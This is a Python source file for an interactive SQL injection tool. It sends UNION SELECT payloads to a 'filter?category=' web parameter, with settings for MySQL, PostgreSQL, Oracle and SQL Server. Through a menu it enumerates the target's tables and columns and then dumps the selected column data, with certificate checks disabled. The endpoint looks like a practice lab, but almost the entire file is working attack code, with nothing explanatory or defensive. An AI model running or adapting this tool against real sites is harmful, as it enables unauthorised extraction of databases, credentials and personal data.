import sys
import requests
from bs4 import BeautifulSoup
import re

list_databases={
   'MySQL':{'dbVersColumn':'@@version',
            'dbVersTable':'',
            'dbConcat':' ',
            'dbTables':'FROM information_schema.tables',
            'dbColumns':'FROM information_schema.columns',
            'dbSchema':'table_schema'},
   'PostgreSQL':{'dbVersColumn':'version()',
            'dbVersTable':'',
            'dbConcat':'||',
            'dbTables':'FROM information_schema.tables',
            'dbColumns':'FROM information_schema.columns',
            'dbSchema':'table_schema'},
   'Oracle':{'dbVersColumn':'banner',
            'dbVersTable':'FROM v$version',
            'dbConcat':'||',
            'dbTables':'FROM all_tables',
            'dbColumns':'FROM all_tab_columns',
            'dbSchema':'owner'},
   'Microsoft':{'dbVersColumn':'@@version',
            'dbVersTable':'',
            'dbConcat':'+',
            'dbTables':'FROM information_schema.tables',
            'dbColumns':'FROM information_schema.columns',
            'dbSchema':'table_schema'}
}

listTables = []
listColumns = []
V_TABLE =-1
V_COLUMNS = []

menu_options = {
    1: 'List of Tables',
    2: 'List of Columns',
    3: 'Table Info',
    4: 'Exit',
}

def print_menu():
    for key in menu_options.keys():
        print (key, '--', menu_options[key] )

def option1(url,num_col,string_column,sqlDB):
    print(sqlDB)
    listTables.clear()
    path = "filter?category="
    payload_list = ['null'] * num_col
    payload_list[string_column-1] = list_databases[sqlDB]['dbSchema']+"||'.'||table_name" 
    sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[sqlDB]['dbTables']+" order by "+ str(string_column) +" -- -"
    print(url + path + sql_payload)
    r = requests.get(url + path + sql_payload, timeout=2,verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    #print(soup)
    db_tables = soup.findAll("th")
    if len(db_tables)==0:
        db_tables = soup.findAll("td")
    i=1
    for li in db_tables:
        listTables.append(li.text)
        print(i,li.text)
        i=i+1
    
    option = int(input('Select a Table: '))
    print('[+] Table Selected: '+listTables[option-1])
    return listTables[option-1]

def option2(url,num_col,string_column,sqlDB,table_name):
    listColumns.clear()
    path = "filter?category="
    payload_list = ['null'] * num_col
    payload_list[string_column-1] = "column_name"
    sql_payload = "' union select " + ','.join(payload_list) +\
        " "+list_databases[sqlDB]['dbColumns']+ \
        " where table_name = '"+ table_name.split('.')[1] +"' order by "+ str(string_column) +" -- -"
    print(url + path + sql_payload)
    r = requests.get(url + path + sql_payload, timeout=2, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    #print(soup)
    db_tables = soup.findAll("th")
    if len(db_tables)==0:
        db_tables = soup.findAll("td")
    i=1
    for li in db_tables:
        listColumns.append(li.text)
        print(i,li.text)
        i=i+1
        
    option = str(input('Select Columns (coma): '))
    sublist = list(map(int, option.split(',')))
    print(sublist)
    mylist = list( listColumns[i-1] for i in sublist )
    print(mylist)
    return mylist

def option3(url,num_col,string_column,sqlDB,table_name,columns):
    path = "filter?category="
    payload_list = ['null'] * num_col
    payload_list[string_column-1] = "||'~'||".join(columns)
    sql_payload = "' union select " + ','.join(payload_list) +\
        " FROM "+table_name+ \
        " order by "+ str(string_column) +" -- -"
    print(url + path + sql_payload)
    r = requests.get(url + path + sql_payload, timeout=2, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    #print(soup)
    db_tables = soup.findAll("th")
    if len(db_tables)==0:
        db_tables = soup.findAll("td")
    i=1
    for li in db_tables:
        listColumns.append(li.text)
        print(i,li.text)
        i=i+1

def menuSQLi(url,num_col,string_column,sqlDb):
    while(True):
        print_menu()
        option = ''
        try:
            option = int(input('Enter your choice: '))
        except:
            print('Wrong input. Please enter a number ...')
        #Check what choice was entered and act accordingly
        if option == 1:
            print('La BD ',sqlDb)
            global V_TABLE
            V_TABLE = option1(url,num_col,string_column,sqlDb)
        elif option == 2:
            global V_COLUMNS
            V_COLUMNS=option2(url,num_col,string_column,sqlDb,V_TABLE)
        elif option == 3:
            option3(url,num_col,string_column,sqlDb,V_TABLE,V_COLUMNS)
        elif option == 4:
            print('Thanks message before exiting')
            exit()
        else:
            print('Invalid option. Please enter a number between 1 and 4.')